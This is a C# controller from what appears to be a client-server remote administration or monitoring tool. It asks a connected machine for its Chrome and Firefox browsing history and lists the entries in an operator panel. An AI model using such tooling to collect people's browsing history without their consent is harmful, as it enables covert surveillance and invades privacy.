using System;
using System.Collections.Generic;
using System.Windows.Forms;

namespace Serveur_Client_PCC.Controller
{
    class HistoriquesController : ControllerBase
    {
        public const string Name = "Historiques";

        public void Historiques(string json)
        {
            dynamic data = serializer.DeserializeObject(json);

            formPanel.list_hist_chrome.Invoke((MethodInvoker)(() => { formPanel.list_hist_chrome.Items.Clear(); }));
            dynamic hist = serializer.DeserializeObject(data["chrome"]);
            foreach (dynamic item in hist["history"])
            {
                formPanel.list_hist_chrome.Invoke((MethodInvoker)(() =>
                {
                    formPanel.list_hist_chrome.Items.Add(new ListViewItem(new string[] { Convert.ToString(item["name"]), Convert.ToString(item["title"]), Convert.ToString(item["url"]) }));
                }));
            }
            hist = serializer.DeserializeObject(data["firefox"]);
            foreach (dynamic item in hist["history"])
            {
                formPanel.list_hist_chrome.Invoke((MethodInvoker)(() =>
                {
                    formPanel.list_hist_chrome.Items.Add(new ListViewItem(new string[] { Convert.ToString(item["name"]), Convert.ToString(item["title"]), Convert.ToString(item["url"]) }));
                }));
            }
            setStatus("Historiques actualiser avec succés");
        }

        public void ReqHistoriques()
        {
            Dictionary<string, object> obj = new Dictionary<string, object>();
            obj.Add("controller", Name);
            obj.Add("method", "Historiques");

            List<string> parameters = new List<string> { };
            obj.Add("parameters", parameters);

            send(Encode(obj));
        }


    }
}
